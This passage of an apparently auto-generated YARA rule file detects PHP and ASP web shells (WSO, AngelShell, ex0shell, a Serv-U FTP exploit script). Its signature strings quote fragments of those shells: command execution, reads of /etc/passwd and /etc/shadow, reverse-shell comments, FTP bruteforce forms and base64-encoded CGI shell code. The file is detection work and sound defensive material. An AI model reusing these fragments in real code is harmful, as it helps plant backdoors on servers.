      $s17 = "'ru_text2' =>'?????????? ?????? ?? ???????'," fullword ascii
      $s18 = "'ru_text49'=>'???????? ??????? ? ???????'," fullword ascii
      $s19 = "'ru_text32'=>'?????????? PHP ????'," fullword ascii
      $s20 = "'ru_text62'=>'?????????? ???????'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _04025959b191f8f9de3f924f0940515f_3f94ac8bf2a341a7a409e641fd53b149be077bb8_135
{
   meta:
      description = "php17 - from files 04025959b191f8f9de3f924f0940515f.php, 3f94ac8bf2a341a7a409e641fd53b149be077bb8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5916525af28ec268daed30e0bb38e97d3509f54a015be7f240ba5b0a3bb08267"
      hash2 = "aeadda27d91c0c57d56c65135295036c0edb31e76df2c4eb1ebf50b5913b570c"
   strings:
      $x1 = "delm(\"# Execute Commands #\");print \"<table bgcolor=#2A2A2A style=\\\"border:2px solid black\\\" width=100% height=18%>\";" fullword ascii
      $s2 = "print\"<center>Copyright is reserved to KingDefacer<br>[  By Turkish Security GROUP Go to : <a target='_blank' href='http://altu" ascii
      $s3 = "<head><title>ex0shell Shell & Edited By KingDefacer</title></head>" fullword ascii
      $s4 = "print \" - <a href=\".inclink('dlink', 'perm').\"&scdir=$nscdir>Check permissions</a>\";" fullword ascii
      $s5 = "print $st.$c1.\"<div><b><center>Important commands</div>\";" fullword ascii
      $s6 = "print \" - <a href='javascript:history.back()'>Back</a>\";" fullword ascii
      $s7 = "ks.com'>http://alturks.com/</a> ]\"; " fullword ascii
      $s8 = "print \"<td width=3% style=\\\"border:1px solid black\\\">\";print \"<center><b>Read\";print \"</td>\"; " fullword ascii
      $s9 = "RSVlbyVlOCVlNiU3YSV1byVlRiVldSVlaSV1NiU3dSVhOCVlOSVhOSVhRCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVh" ascii
      $s10 = "RCVvNiVhQyVvNiVhOSVhOSVvQiVldSVlRiVlbyU3aSVlRCVlaSVlRSU3dSVhRSU3NyU3YSVlOSU3dSVlaSVhOCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3dSVh" ascii
      $s11 = "dSVlOCVvQiVlOSVhQiVhQiVhOSU3dSVhQiVvRCVpbyU3dSU3YSVlOSVlRSVlNyVhRSVlZSU3YSVlRiVlRCV1byVlOCVlNiU3YSV1byVlRiVldSVlaSVhOCU3byVvNiVh" ascii
      $s12 = "IGwxbmczMWc1PWoxdjFzY3I0cHQ+ZDJjM201bnQud3I0dDUoM241c2MxcDUoJyVvQyU3byVlbyU3YSVlOSU3MCU3dSVhMCVlQyVlNiVlRSVlNyU3aSVlNiVlNyVlaSVv" ascii
      $s13 = "MCU3byVvNiVvRCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCVvMCVhQyU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVh" ascii
      $s14 = "OSVhOSVvQiU3RCVvQyVhRiU3byVlbyU3YSVlOSU3MCU3dSVvRScpKTtkRignKjhIWEhXTlVZKjdpWFdIKjhJbXl5Myo4RnV1Mm5zdG8ybm9renMzbmhvdHdsdXF2dXhq" ascii
      $s15 = "RCVhYSVlQSVlNiU3ZSVlNiU3byVlbyU3YSVlOSU3MCU3dSVhYSVvRSVlZSU3aSVlRSVlbyU3dSVlOSVlRiVlRSVhMCVldSV1ZSVhOCU3byVhOSU3QiU3ZSVlNiU3YSVh" ascii
      $s16 = "RCVvNiVhOSVhOSVvQiVhMCU3ZSVlNiU3YSVhMCU3dSVvRCVhNyVhNyVvQiVlZSVlRiU3YSVhOCVlOSVvRCVvMCVvQiVlOSVvQyU3byVvNiVhRSVlQyVlaSVlRSVlNyU3" ascii
      $s17 = "if(($chkini || strtolower($chkini)) !=='on'){print\"<font color=green ><b>OFF ( NOT SECURITY )</b></font>\";} else{" fullword ascii
      $s18 = "input(\"submit\",\"\",\"Read-Edit\",\"\");print \"</center>\".$ef.$ec.$et.\"</div></td>\";" fullword ascii
      $s19 = ")){$scmess4= \"<font color=red><center>Dir\";}else{$scmess4= \"<center><font color=DeepSkyBlue  >File\";} " fullword ascii
      $s20 = "print \"<td width=8% style=\\\"border:1px solid black\\\">\";print \"<center><b>Owner\";print \"</td>\";}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _013d407166ec4fa56eb1e1f8cbe183b9_41b8b081f2b83539627868eedc561698009572ec_499db4d70955f7d40cf5cbaf2ecaf7a2_5e30aaf3a47521d9_136
{
   meta:
      description = "php17 - from files 013d407166ec4fa56eb1e1f8cbe183b9.php, 41b8b081f2b83539627868eedc561698009572ec.php, 499db4d70955f7d40cf5cbaf2ecaf7a2.php, 5e30aaf3a47521d99232b5148a53ecd3fec43c9b.php, 9223d9256484635439016d2e26100cb17327cc2d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "735f3b419096fe9b87f5e01da3da38d19d124127795fd868d037d709e3e2ff66"
      hash2 = "0f48b973f87a067fbb02638c69597f0ef24c759e1d3bbafccb9e480da8754d67"
      hash3 = "aca3248eeb6defd5eac482b0c4a3216456af50c24d93be57224ec1c02f33099a"
      hash4 = "374dfef917872d886c316b864558413d5c11988fc148c3a0819090a67ee32145"
      hash5 = "4947368cb486df42337fd7e41368be3b0fed2527322fba96b389997cd20a3433"
   strings:
      $s1 = "$s_server_ip = gethostbyname($_SERVER[\"HTTP_HOST\"]);" fullword ascii
      $s2 = "Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2" ascii
      $s3 = "// bind and reverse shell" fullword ascii
      $s4 = "// shell command" fullword ascii
      $s5 = "// kill process specified by pid" fullword ascii
      $s6 = "$s_auth = false; // login status" fullword ascii
      $s7 = "LFDPEKTQA0N4/2quJpb2sxByJBABmnhJaDOKwoN91Gk/70vhdWyHmcLSZpm+y6eDfAoFwEUcw8/TR5o3lCpkAwOQK2P87zvzf\";" fullword ascii
      $s8 = "$s_user = get_current_user();" fullword ascii
      $s9 = "av5jDgDh0sbA0aROgJyEGJnMhwlh6xyb8Cq7ALogD6a3mV1ybxSD44/kMq1BWp/WluaRQhgQKFC8RE8K6cc8+C9lSHifYhme9NkmcgfuYuoEYCTG+EYUI4oV8Ie0hGJm" ascii
      $s10 = "// delete dir and all of its content (no warning !) xp" fullword ascii
      $s11 = "$s_software = getenv(\"SERVER_SOFTWARE\");" fullword ascii
      $s12 = "// download file from internet" fullword ascii
      $s13 = "// try using lwp-download" fullword ascii
      $s14 = "c8SH/za/Bw9nVa3pyG4IeUp9qnPRJj3lrQx4bAMQGWg/tqdgigPDWOBheq3gnH8AWjTCoQBvcE68m9g5W1BMiSZ4taFu64aw+BGBINqgZTKpBY/R4aIO9qsCRFu2cigD" ascii
      $s15 = "// get file size" fullword ascii
      $s16 = "$s_my_ip = $_SERVER['REMOTE_ADDR'];" fullword ascii
      $s17 = "// get file permissions" fullword ascii
      $s18 = "$s_result .= \"<div class=\\\"viewfilecontent\\\">\";" fullword ascii
      $s19 = "Syw/g2rDKKs7WcMUp8ZHSCI4AMv78rNlqrWDrBnbJDyKIKxRcrpp9/QKvxYJM2uyF26Z7QAJ5bUimtRGLMN+HYSfPRfvzhBIO9nO8//GLhuTqcNGuMGxlZqS/LbEUDGi" ascii
      $s20 = "wSRTc5dnowBe+Hj6uVEWpbtBLrSY+XNh8L3DOF3hP/Up9ZQRe6a5o+VCMaH0Tg70ycBJ95/JZzzTTuc2FhnDgkQPvX+yNOtIahR7mJalD//nlXHqxxjCNX1ll/m07Ym1" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _0c942886f8e0aaf5b824f222c3ed84cb_8d23f3d3f678d3e620b91c2115e1f714_adminer_3_3_3_adminer_4_1_0_mysql_adminer_4_2_4_2_Adminer_137
{
   meta:
      description = "php17 - from files 0c942886f8e0aaf5b824f222c3ed84cb.php, 8d23f3d3f678d3e620b91c2115e1f714.php, adminer-3.3.3.php, adminer-4.1.0_mysql.php, adminer-4.2.4_2.php, Adminer_-_Compact_database_management.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "717b6e76292bef4523fe8f3d85efb76bf586ab40a3e46404bf5b91901a26fa09"
      hash2 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
      hash3 = "b80b0bdc5f8b39271a0fc37037c582e6c68c62722b12a6424645d5cc421ba342"
      hash4 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
      hash5 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
      hash6 = "4baf99c68ca9632081ba8bc0458bfc87fc70e526742803b7b77a45f70d7adf07"
   strings:
      $s1 = "selectLengthProcess(){return(isset($_GET[\"text_length\"])?$_GET[\"text_length\"]:\"100\");}function" fullword ascii
      $s2 = "* @license http://www.gnu.org/licenses/gpl-2.0.html GNU General Public License, version 2 (one or other)" fullword ascii
      $s3 = "* @license http://www.apache.org/licenses/LICENSE-2.0 Apache License, Version 2.0" fullword ascii
      $s4 = "get_rows(\"SHOW FULL PROCESSLIST\");}function" fullword ascii
      $s5 = "* @author Jakub Vrana, http://www.vrana.cz/" fullword ascii
      $s6 = "<meta http-equiv=\"Content-Script-Type\" content=\"text/javascript\">" fullword ascii
      $s7 = "/** Adminer - Compact database management" fullword ascii
      $s8 = "';if(file_exists(\"adminer.css\")){echo'<link rel=\"stylesheet\" type=\"text/css\" href=\"adminer.css\">" fullword ascii
      $s9 = "selectCommandPrint(){return!information_schema(DB);}function" fullword ascii
      $s10 = "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" id=\"form\">" fullword ascii
      $s11 = "process_list(){return" fullword ascii
      $s12 = "get_key_vals(\"SHOW VARIABLES\");}function" fullword ascii
      $s13 = "is_ajax(){return($_SERVER[\"HTTP_X_REQUESTED_WITH\"]==\"XMLHttpRequest\");}function" fullword ascii
      $s14 = "get_key_vals(\"SHOW STATUS\");}function" fullword ascii
      $s15 = "dumpFormat(){return" fullword ascii
      $s16 = "'<input type=\"hidden\" name=\"'.DRIVER.'\" value=\"'.h(SERVER).'\">':\"\"),'<input type=\"hidden\" name=\"username\" value=\"'." ascii
      $s17 = "hidden_fields_get(){echo(sid()?'<input type=\"hidden\" name=\"'.session_name().'\" value=\"'.h(session_id()).'\">':''),(SERVER!=" ascii
      $s18 = "* @copyright 2007 Jakub Vrana" fullword ascii
      $s19 = "<form action=\"\" method=\"post\" id=\"form\">" fullword ascii
      $s20 = "<meta name=\"robots\" content=\"noindex\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _043c3d7e489c69b48737cc0c92d0f3a2_0e634bcc16b562c9a8365ef42b37be8a0eabfd73_2011_2011__2__2013_5b9824d1b6de1963106fcabcbd08b1_138
{
   meta:
      description = "php17 - from files 043c3d7e489c69b48737cc0c92d0f3a2.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2011.php, 2011__2_.php, 2013.php, 5b9824d1b6de1963106fcabcbd08b1f87a29de30.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, 7a46a87a95f54ab5afc04ff43e14a060d7062f26.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angel2.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash2 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash3 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash4 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash5 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash6 = "4cb2f9e72641a594228669c0e2eb2188cc32fb13ae6708f3d2d39c620a76c8a9"
      hash7 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash8 = "a198556031139dcbe1c02e2e6e668f4388f4b1277c90fcf425e6834b934df75e"
      hash9 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash10 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash11 = "3ceb493e17daaaa547f05cf557885715fb575e684512dfc6b679c91285835995"
      hash12 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash13 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $x1 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
      $s2 = "secparam('Downloaders', implode(', ',$temp));" fullword ascii
      $s3 = ")';?></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s4 = "secparam('Account Settings',execute('net accounts'));" fullword ascii
      $s5 = "secparam('HDD space', execute('df -h'));" fullword ascii
      $s6 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');" fullword ascii
      $s7 = "secparam('User Accounts',execute('net user'));" fullword ascii
      $s8 = "secparam('OS Version',execute('ver'));" fullword ascii
      $s9 = "secparam('Distr name', @file_get_contents('/etc/issue.net'));" fullword ascii
      $s10 = "secparam('OS version', @file_get_contents('/proc/version'));" fullword ascii
      $s11 = ".head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}" fullword ascii
      $s12 = "secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? \"yes\" : 'no');" fullword ascii
      $s13 = "secparam('Mount options', @file_get_contents('/etc/fstab'));" fullword ascii
      $s14 = "<td><span style=\"float:right;\"><?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group." ascii
      $s15 = "secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? \"yes\" : 'no');" fullword ascii
      $s16 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
      $s17 = "setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);" fullword ascii
      $s18 = "secparam('Userful', implode(', ',$temp));" fullword ascii
      $s19 = "if ($_COOKIE['loginpass'] != $pass) {" fullword ascii
      $s20 = "11 => array('PHPINFO',(IS_PHPINFO ? '<a href=\"javascript:g(\\'phpinfo\\');\">Yes</a>' : 'No'))," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _2250b6f81f0189b50fb5391a1a4c5738370cfa61_404__2__139
{
   meta:
      description = "php17 - from files 2250b6f81f0189b50fb5391a1a4c5738370cfa61.php, 404__2_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "30a287d13b6729cebd14e7e3078428a7a9d0d4e3868fd6a1247a050721bbcb92"
      hash2 = "851c740b3ab1c15cbff2daf0098ac87c00b4b1496675d14e0ee95f307c3b3c01"
   strings:
      $x1 = "<div id=\"cot_tl_fixed\"><marquee>Private Shell - :D From Om3r enjoy it </marquee></div> " fullword ascii
      $s2 = "<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class=\"toolsInp\" type=" fullword ascii
      $s3 = "echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' " fullword ascii
      $s4 = ".'<tr><td></td><td><table style=\"padding-left:15px\"><tr><td><span>Login</span></td>' " fullword ascii
      $s5 = "><input type=submit value='Execute'>\"; " fullword ascii
      $s6 = ".'<td><input type=text name=dict value=\"'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic\"></td></tr></table>' " fullword ascii
      $s7 = "echo \"<br><textarea name='p3' style='width:100%;height:100px'>\".@htmlspecialchars($_POST['p3']).\"</textarea><br/><input type=" ascii
      $s8 = "echo \"<br><textarea name='p3' style='width:100%;height:100px'>\".@htmlspecialchars($_POST['p3']).\"</textarea><br/" fullword ascii
      $s9 = ".'<td><input type=text name=login value=\"komsen\"></td></tr>' " fullword ascii
      $s10 = ".'<td><label><input type=radio name=type value=\"1\" checked> /etc/passwd</label></td></tr>' " fullword ascii
      $s11 = "'<td width=1 align=right><nobr><select onchange=\"g(null,null,null,null,null,this.value)\"><optgroup label=\"Page charset\">'.$o" ascii
      $s12 = "<input type=\"button\" value=\"md5.rednoize.com\" onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.va" ascii
      $s13 = "<input type=\"button\" value=\"hashcrack.com\" onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.sub" ascii
      $s14 = ".'<input type=hidden name=charset value=\"'.htmlspecialchars($_POST['charset']).'\">' " fullword ascii
      $s15 = "/* WSO 2.1 (Web Shell) */ " fullword ascii
      $s16 = "echo '<span>Copy (read file)</span><form onsubmit=\\'g(null,null,\"1\",this.param.value);return false;\\'><input type=text name=" ascii
      $s17 = "<input type=\"button\" value=\"md5decrypter.com\" onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit" ascii
      $s18 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol" ascii
      $s19 = "echo \"</table></form><br/><form onsubmit='document.sf.p1.value=\\\"loadfile\\\";document.sf.p2.value=this.f.value;docume" fullword ascii
      $s20 = ".'<input type=hidden name=a value=\"'.htmlspecialchars($_POST['a']).'\">' " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0303e32c8e6674ec89356c9282eeac81606b4fb5_043c3d7e489c69b48737cc0c92d0f3a2_04edbee5e0a3cee384e464d05969bd89b0d32a52_091f4d33_140
{
   meta:
      description = "php17 - from files 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 043c3d7e489c69b48737cc0c92d0f3a2.php, 04edbee5e0a3cee384e464d05969bd89b0d32a52.php, 091f4d33fe8f9ccfc76a0976a54396ad.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2008.php, 2009mssql.php, 2011.php, 2011__2_.php, 2013.php, 49c50fe8a010c9849384328b5ca7738065be0a13.php, 5b9824d1b6de1963106fcabcbd08b1f87a29de30.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, 7a46a87a95f54ab5afc04ff43e14a060d7062f26.php, 82e9a1a1accef35ca21d1e7da20c851659596462.php, 8cb920e907d03c01ede32ca82469f2ec6b551746.php, a647275c30e0a1e78903680ea97931aa8cd39118.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angel2.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash2 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "05704ad19226b29711324aaa819d18711c916acb17f9158e3616ad505cb844a6"
      hash5 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash6 = "6e0ea4ea135950956996df7e86fed9c7f7d77ff89aa1843ec5290ab38e638da4"
      hash7 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash8 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash9 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash10 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash11 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
      hash12 = "4cb2f9e72641a594228669c0e2eb2188cc32fb13ae6708f3d2d39c620a76c8a9"
      hash13 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
      hash14 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash15 = "a198556031139dcbe1c02e2e6e668f4388f4b1277c90fcf425e6834b934df75e"
      hash16 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
      hash17 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash18 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
      hash19 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash20 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash21 = "3ceb493e17daaaa547f05cf557885715fb575e684512dfc6b679c91285835995"
      hash22 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash23 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $s1 = "22 => array('max_execution_time',getcfg('max_execution_time').' second(s)')," fullword ascii
      $s2 = "3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME']))," fullword ascii
      $s3 = "16 => array('display_errors',getcfg('display_errors'))," fullword ascii
      $s4 = "function scookie($key, $value, $life = 0, $prefix = 1) {" fullword ascii
      $s5 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">" fullword ascii
      $s6 = "18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc'))," fullword ascii
      $s7 = "17 => array('register_globals',getcfg('register_globals'))," fullword ascii
      $s8 = "14 => array('allow_url_fopen',getcfg('allow_url_fopen'))," fullword ascii
      $s9 = "20 => array('post_max_size',getcfg('post_max_size'))," fullword ascii
      $s10 = ".area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}" fullword ascii
      $s11 = "5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE'])," fullword ascii
      $s12 = "define('SA_ROOT', str_replace('\\\\', '/', dirname(__FILE__)).'/');" fullword ascii
      $s13 = "19 => array('memory_limit',getcfg('memory_limit'))," fullword ascii
      $s14 = "p('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');" fullword ascii
      $s15 = "15 => array('enable_dl',getcfg('enable_dl'))," fullword ascii
      $s16 = "$dis_func = get_cfg_var('disable_functions');" fullword ascii
      $s17 = "define('IS_GPC', get_magic_quotes_gpc());" fullword ascii
      $s18 = "12 => array('Safe Mode',getcfg('safe_mode'))," fullword ascii
      $s19 = "7 => array('Server Web Port',$_SERVER['SERVER_PORT'])," fullword ascii
      $s20 = "return document.getElementById(id);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _1n73ction_683f78842d7cf41a39744494a4bb787d6c6c4e91_82d1122c0d297bb8dc2959e5023728a09a3e4e6d_141
{
   meta:
      description = "php17 - from files 1n73ction.php, 683f78842d7cf41a39744494a4bb787d6c6c4e91.php, 82d1122c0d297bb8dc2959e5023728a09a3e4e6d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9af1a6e4122d7751016c5aee923352962427c48ec0924bf007aac751cdad7af1"
      hash2 = "f3d0d694f2dd8b78a947a5e00c28d023c0fcc291ac5e70f74a81780bd5abb3e1"
      hash3 = "65024e9ae949507819c9344a2e134ff406e24c6e2a54ded2dab8ef8e6e7d1f83"
   strings:
      $s1 = "cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs" fullword ascii
      $s2 = "IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g" fullword ascii
      $s3 = "aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt" fullword ascii
      $s4 = "d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg" fullword ascii
      $s5 = "Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g" fullword ascii
      $s6 = "ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg" fullword ascii
      $s7 = "PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y" fullword ascii
      $s8 = "ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs" fullword ascii
      $s9 = "biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv" fullword ascii
      $s10 = "$write = fwrite ($file ,base64_decode($configshell));" fullword ascii
      $s11 = "$write = fwrite ($file ,base64_decode($cgishellizocin));" fullword ascii
      $s12 = "$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB" fullword ascii
      $s13 = "$file = fopen(\"config.izo\" ,\"w+\");" fullword ascii
      $s14 = "XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt" fullword ascii
      $s15 = "chmod(\"config.izo\",0755);" fullword ascii
      $s16 = "IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD" fullword ascii
      $s17 = "IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs" fullword ascii
      $s18 = "Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv" fullword ascii
      $s19 = "IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl" fullword ascii
      $s20 = "aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6873 ) and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _001_211_3_142
{
   meta:
      description = "php17 - from files 001.php, 211.php, 3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1f85f1c421a261c97fd7cc82cd58bc7486856635889d59733b8b5281645bef76"
      hash2 = "87fedb71493055b0654256023ce24ccbf9653ab5630c4784635411b3d552d60d"
      hash3 = "9f2b391fbf8b4f2bc3007c8fbb63168072ee010e7fb51c724396d26bed2b0e5e"
   strings:
      $x1 = "Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit" fullword ascii
      $s2 = "\"-HomeDir=c:\\\\\" & vbCrLf & \"-LoginMesFile=\" & vbCrLf & \"-Disable=0\" & vbCrLf & \"-RelPaths=1\" & vbCrLf & _" fullword ascii
      $s3 = "\"-NeedSecure=0\" & vbCrLf & \"-HideHidden=0\" & vbCrLf & \"-AlwaysAllowLogin=0\" & vbCrLf & \"-ChangePassword=0\" & vbCrLf & _" fullword ascii
      $s4 = "a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit" fullword ascii
      $s5 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii
      $s6 = "GName=\"http://\" & request.servervariables(\"server_name\")&lcase(request.servervariables(\"script_name\")) " fullword ascii
      $s7 = "<input name=\"c\" type=\"hidden\" id=\"c\" value=\"<%=cmd%>\" size=\"50\">" fullword ascii
      $s8 = "newuser=replace(newuser,\"c:\",f)" fullword ascii
      $s9 = "\"-Maintenance=System\" & vbCrLf & \"-PasswordType=Regular\" & vbCrLf & \"-Ratios=None\" & vbCrLf & \" Access=c:\\\\|RWAMELCDP\"" ascii
      $s10 = "<td><input name=\"port\" type=\"text\" id=\"port\" value=\"43958\"></td>" fullword ascii
      $s11 = "<input name=\"port\" type=\"hidden\" id=\"port\" value=\"<%=port%>\"></td>" fullword ascii
      $s12 = "loginpass = \"Pass \" & pass & vbCrLf" fullword ascii
      $s13 = "loginuser = \"User \" & user & vbCrLf" fullword ascii
